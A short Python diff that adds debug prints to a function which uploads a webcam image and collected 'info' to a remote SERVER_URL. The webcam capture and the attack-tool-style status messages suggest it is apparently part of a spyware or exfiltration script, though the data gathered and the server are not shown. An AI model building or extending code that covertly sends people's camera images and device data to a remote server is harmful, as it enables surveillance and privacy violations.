@@ -1,5 +1,6 @@
 def enviar_al_servidor(info, archivos):
     try:
+        print("[*] Info a enviar:", json.dumps(info, indent=2))
         with open(archivos["webcam"], "rb") as img:
             files = {
                 "image": img,
@@ -9,6 +10,7 @@ def enviar_al_servidor(info, archivos):
             }
             response = requests.post(SERVER_URL, files=files)
             print("[+] Enviado al servidor:", response.status_code)
+            print("[*] Respuesta del servidor:", response.text)
     except Exception as e:
         print(f"[!] Error enviando datos: {e}")
 
